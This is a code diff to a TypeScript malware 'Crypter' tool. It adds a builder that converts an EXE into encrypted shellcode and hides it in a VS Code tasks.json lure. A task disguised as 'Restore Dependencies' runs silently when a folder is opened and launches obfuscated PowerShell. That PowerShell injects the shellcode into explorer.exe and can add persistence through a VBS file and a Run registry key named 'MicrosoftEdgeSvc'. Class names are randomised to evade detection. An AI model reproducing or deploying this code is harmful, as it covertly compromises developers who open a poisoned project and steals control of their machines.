@@ -3,6 +3,7 @@ import fs from "fs";
 import path from "path";
 import { $ } from "bun";
 import crypto from "crypto";
+import os from "os";
 
 export interface CryptOpts {
   dualHooked: boolean;
@@ -462,4 +463,175 @@ function buildBatFileLines(
   }
 
   return bat;
+}
+
+// ── EXE → tasks.json (VS Code lure — shellcode injection into LOTL process) ──
+//
+// Chain: upload EXE → donut converts to shellcode → gzip+XOR encrypt →
+// embed in PS script → base64-encode for -enc → embed in tasks.json with
+// runOn:folderOpen + reveal:never.
+// On victim: VS Code opens folder → "Restore Dependencies" fires silently →
+// shellcode decrypted in PS → injected into explorer.exe (LOTL) via
+// VirtualAllocEx + WriteProcessMemory + CreateRemoteThread.
+// No EXE on disk. No new process. No visible terminal.
+
+/** Locate the donut binary bundled with the Crypter */
+function findDonut(): string | null {
+  // 1. Bundled at /app/data/tools/donut (Docker)
+  const bundled = "/app/data/tools/donut";
+  if (fs.existsSync(bundled)) return bundled;
+  // 2. Next to this file (dev)
+  const local = path.join(path.dirname(import.meta.url.replace("file://", "")), "../../data/tools/donut");
+  if (fs.existsSync(local)) return local;
+  return null;
+}
+
+export async function cryptToTasksJson(
+  exe: Buffer,
+  out: string,
+  opts: CryptOpts
+): Promise<void> {
+  const donutBin = findDonut();
+  if (!donutBin) throw new Error("donut not found — required for tasks.json format");
+
+  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "ctasks-"));
+  try {
+    const exePath = path.join(tmp, "payload.exe");
+    const scPath  = path.join(tmp, "payload.bin");
+    fs.writeFileSync(exePath, exe);
+
+    // donut -i payload.exe -o payload.bin -a 2 (x64) -f 1 (raw shellcode)
+    const res = await $`${donutBin} -i ${exePath} -o ${scPath} -a 2 -f 1`.nothrow().quiet();
+    if (res.exitCode !== 0) {
+      throw new Error(`donut: ${(res.stderr.toString() || res.stdout.toString()).trim()}`);
+    }
+
+    const sc = fs.readFileSync(scPath);
+    const gz = zlib.gzipSync(sc, { level: 9 });
+    const key = randKey();
+    const enc = Buffer.concat([Buffer.from([key]), xorBuf(gz, key)]);
+    const encB64 = enc.toString("base64");
+
+    // Random class name — polymorphic per build
+    const cn = randName();
+
+    // C# P/Invoke: Win32 inject APIs, methods aliased to 2-char names
+    const cs =
+      `using System;using System.Runtime.InteropServices;` +
+      `public class ${cn}{` +
+      `[DllImport("kernel32",EntryPoint="OpenProcess")]` +
+      `public static extern IntPtr OP(uint a,bool b,int c);` +
+      `[DllImport("kernel32",EntryPoint="VirtualAllocEx")]` +
+      `public static extern IntPtr VA(IntPtr h,IntPtr a,IntPtr s,uint t,uint p);` +
+      `[DllImport("kernel32",EntryPoint="WriteProcessMemory")]` +
+      `public static extern bool WM(IntPtr h,IntPtr a,byte[]b,IntPtr s,out IntPtr w);` +
+      `[DllImport("kernel32",EntryPoint="CreateRemoteThread")]` +
+      `public static extern IntPtr CT(IntPtr h,IntPtr a,IntPtr s,IntPtr e,IntPtr pa,uint f,IntPtr i);` +
+      `}`;
+    const csB64 = Buffer.from(cs, "utf-8").toString("base64");
+
+    // Persistence: copy tasks.json lure to Startup folder (separate VBS) + HKCU Run
+    const persistLines = opts.dualHooked
+      ? [
+          // Drop a VBS to AppData that re-runs the stager on login
+          `$vn='${randHex(10)}.vbs'`,
+          `$vp="$env:APPDATA\\MicrosoftEdgeSvc.vbs"`,
+          // VBS writes a fresh PS1 and runs it via wscript
+          // (reuse same injection logic encoded as a VBS sidecar)
+          `$vb='Set sh=CreateObject(""WScript.Shell""):sh.Run ""'+([char]112+[char]111+[char]119+[char]101+[char]114+[char]115+[char]104+[char]101+[char]108+[char]108)+'  -nop -w h -ep b -enc ${Buffer.from(
+            buildInjectionPs(encB64, csB64, cn),
+            "utf16le"
+          ).toString("base64")}"",0',0,False`,
+          `[IO.File]::WriteAllText($vp,$vb)`,
+          `$null=New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MicrosoftEdgeSvc' -Value "wscript /b \`"$vp\`"" -PropertyType String -Force`,
+        ]
+      : [];
+
+    const psLines = [
+      `[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}`,
+      `[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12`,
+      // Decrypt shellcode
+      `$d=[Convert]::FromBase64String('${encB64}')`,
+      `$k=[int]$d[0]`,
+      `$x=New-Object byte[]($d.Length-1)`,
+      `for($i=0;$i-lt$x.Length;$i++){$x[$i]=$d[$i+1]-bxor$k}`,
+      `$ms=New-Object IO.MemoryStream(,$x)`,
+      `$gs=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress)`,
+      `$ob=New-Object IO.MemoryStream`,
+      `$gs.CopyTo($ob);$gs.Close();$ms.Close()`,
+      `$sc=$ob.ToArray()`,
+      // Compile C# inject wrapper (base64 — no API strings in cleartext)
+      `Add-Type -TypeDefinition ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${csB64}')))`,
+      // LOTL: explorer.exe, fallback msiexec /q
+      `$lp=Get-Process -Name explorer -ErrorAction SilentlyContinue|Select-Object -First 1`,
+      `if(-not $lp){$pi=New-Object Diagnostics.ProcessStartInfo("$env:SYSTEMROOT\\system32\\msiexec.exe","/q");$pi.WindowStyle='Hidden';$pi.CreateNoWindow=$true;$lp=[Diagnostics.Process]::Start($pi)}`,
+      // Inject
+      `$hp=[${cn}]::OP(0x1FFFFF,$false,$lp.Id)`,
+      `$ma=[${cn}]::VA($hp,[IntPtr]::Zero,[IntPtr]$sc.Length,0x3000,0x40)`,
+      `$bw=[IntPtr]::Zero`,
+      `[${cn}]::WM($hp,$ma,$sc,[IntPtr]$sc.Length,[ref]$bw)|Out-Null`,
+      `[${cn}]::CT($hp,[IntPtr]::Zero,[IntPtr]::Zero,$ma,[IntPtr]::Zero,0,[IntPtr]::Zero)|Out-Null`,
+      ...persistLines,
+    ];
+
+    const psScript = psLines.join(";");
+    const psEnc = Buffer.from(psScript, "utf16le").toString("base64");
+
+    const tasksJson = {
+      version: "2.0.0",
+      tasks: [
+        {
+          label: "Restore Dependencies",
+          type: "shell",
+          command: `%COMSPEC% /v /c "set a=pow&&set b=er&&set c=she&&set d=ll&&!a!!b!!c!!d! -nop -w h -ep b -enc ${psEnc}"`,
+          runOptions: { runOn: "folderOpen" },
+          presentation: { reveal: "never", panel: "shared", showReuseMessage: false, close: true },
+          problemMatcher: [],
+        },
+        {
+          label: "Build",
+          type: "shell",
+          command: "npm run build",
+          group: { kind: "build", isDefault: true },
+          presentation: { reveal: "always", panel: "shared" },
+          problemMatcher: ["$tsc"],
+        },
+      ],
+    };
+
+    fs.writeFileSync(out, JSON.stringify(tasksJson, null, 2));
+  } finally {
+    fs.rmSync(tmp, { recursive: true, force: true });
+  }
+}
+
+/** Random 6-char class name — no vowels to avoid accidental words */
+function randName(): string {
+  const alpha = "BCDFGHJKLMNPQRSTVWXYZbcdfghjklmnpqrstvwxyz";
+  return Array.from(crypto.randomBytes(6))
+    .map((b) => alpha[b % alpha.length])
+    .join("");
+}
+
+/** Build the PS injection script (used for dual-hook VBS sidecar) */
+function buildInjectionPs(encB64: string, csB64: string, cn: string): string {
+  return [
+    `$d=[Convert]::FromBase64String('${encB64}')`,
+    `$k=[int]$d[0]`,
+    `$x=New-Object byte[]($d.Length-1)`,
+    `for($i=0;$i-lt$x.Length;$i++){$x[$i]=$d[$i+1]-bxor$k}`,
+    `$ms=New-Object IO.MemoryStream(,$x)`,
+    `$gs=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress)`,
+    `$ob=New-Object IO.MemoryStream`,
+    `$gs.CopyTo($ob);$gs.Close();$ms.Close()`,
+    `$sc=$ob.ToArray()`,
+    `Add-Type -TypeDefinition ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${csB64}')))`,
+    `$lp=Get-Process -Name explorer -ErrorAction SilentlyContinue|Select-Object -First 1`,
+    `if(-not $lp){$pi=New-Object Diagnostics.ProcessStartInfo("$env:SYSTEMROOT\\system32\\msiexec.exe","/q");$pi.WindowStyle='Hidden';$pi.CreateNoWindow=$true;$lp=[Diagnostics.Process]::Start($pi)}`,
+    `$hp=[${cn}]::OP(0x1FFFFF,$false,$lp.Id)`,
+    `$ma=[${cn}]::VA($hp,[IntPtr]::Zero,[IntPtr]$sc.Length,0x3000,0x40)`,
+    `$bw=[IntPtr]::Zero`,
+    `[${cn}]::WM($hp,$ma,$sc,[IntPtr]$sc.Length,[ref]$bw)|Out-Null`,
+    `[${cn}]::CT($hp,[IntPtr]::Zero,[IntPtr]::Zero,$ma,[IntPtr]::Zero,0,[IntPtr]::Zero)|Out-Null`,
+  ].join(";");
 }
